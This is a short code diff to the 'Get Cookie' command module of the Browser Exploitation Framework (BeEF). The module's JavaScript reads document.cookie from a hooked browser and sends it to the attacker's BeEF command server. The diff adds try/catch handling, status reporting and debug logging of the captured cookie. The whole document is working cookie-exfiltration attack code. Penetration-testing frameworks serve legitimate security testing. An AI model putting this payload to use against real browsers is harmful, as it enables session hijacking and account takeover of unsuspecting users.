@@ -4,9 +4,12 @@
 // See the file 'doc/COPYING' for copying permission
 //
 
-beef.execute(function() {
-
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie);
-
+try {
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_success());
+      beef.debug("[Get Cookie] Cookie captured: "+document.cookie);
+}catch(e){
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_error());
+      beef.debug("[Get Cookie] Error");
+}
 });
 
